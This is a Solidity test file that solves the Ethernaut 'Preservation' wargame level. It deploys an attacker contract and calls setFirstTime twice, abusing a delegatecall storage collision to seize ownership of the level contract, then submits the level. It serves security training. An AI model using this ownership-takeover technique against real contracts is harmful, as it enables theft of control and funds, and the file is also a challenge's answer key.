pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Preservation/PreservationHackDan.sol";
import "../Preservation/PreservationFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract PreservationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testPreservationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PreservationFactory preservationFactory = new PreservationFactory();
        ethernaut.registerLevel(preservationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(preservationFactory);
        Preservation ethernautPreservation = Preservation(payable(levelAddress));
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////
        PreservationHackDan hack = new PreservationHackDan(tx.origin);
        // Doesn't matter if you call first time or second time
        ethernautPreservation.setFirstTime(uint256(uint160(address(hack))));
        // Number no longer matters here
        ethernautPreservation.setFirstTime(123_456);

        assertEq(ethernautPreservation.owner(), tx.origin, "Wrong owner");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////   

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
